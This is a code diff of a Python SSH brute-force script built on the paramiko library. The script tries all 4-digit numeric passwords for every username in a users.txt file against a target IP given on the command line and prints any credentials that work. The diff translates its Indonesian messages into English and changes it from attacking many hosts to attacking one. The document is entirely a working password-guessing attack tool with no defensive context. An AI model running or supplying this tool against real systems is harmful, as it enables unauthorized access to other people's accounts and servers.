@@ -1,13 +1,14 @@
 import paramiko
 from itertools import product
 import sys
+import os
 
 def try_ssh(host, username, password):
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(host, username=username, password=password, timeout=3)
-        print(f"[SUCCESS] Host: {host} | User: {username} | Password ditemukan: {password}")
+        print(f"[SUCCESS] Host: {host} | User: {username} | Password found: {password}")
         ssh.close()
         return True
     except paramiko.AuthenticationException:
@@ -17,31 +18,30 @@ def try_ssh(host, username, password):
         print(f"[ERROR] Host: {host} | User: {username} | Password: {password} - {e}")
         return False
 
-def brute_force_ssh(hosts, users):
-    print(f"Mulai brute force SSH untuk semua host dan user dengan kombinasi angka 4 digit...")
-    for host in hosts:
-        for user in users:
-            print(f"\nMencoba Host: {host} | User: {user}")
-            for combo in product("0123456789", repeat=4):
-                password = ''.join(combo)
-                if try_ssh(host, user, password):
-                    print("Brute force selesai untuk kombinasi ini.\n")
-                    break
+def brute_force_ssh(host, users):
+    print(f"Starting brute force SSH for host {host} with all users and 4-digit numeric passwords...")
+    for user in users:
+        print(f"\nTrying Host: {host} | User: {user}")
+        for combo in product("0123456789", repeat=4):
+            password = ''.join(combo)
+            if try_ssh(host, user, password):
+                print("Brute force completed for this user.\n")
+                break
 
-def load_list(filename):
-    with open(filename, "r") as f:
-        lines = [line.strip() for line in f if line.strip()]
-    return lines
+def load_users():
+    file_path = "users.txt"
+    if not os.path.exists(file_path):
+        print(f"File users.txt not found!")
+        sys.exit(1)
+    with open(file_path, "r") as f:
+        return [line.strip() for line in f if line.strip()]
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python brute_ssh_multi.py <hosts_file> <users_file>")
+    if len(sys.argv) != 2:
+        print("Usage: python brute_ssh.py <target_ip>")
         sys.exit(1)
-    
-    hosts_file = sys.argv[1]
-    users_file = sys.argv[2]
 
-    hosts = load_list(hosts_file)
-    users = load_list(users_file)
+    target_ip = sys.argv[1]
+    users = load_users()
 
-    brute_force_ssh(hosts, users)
+    brute_force_ssh(target_ip, users)
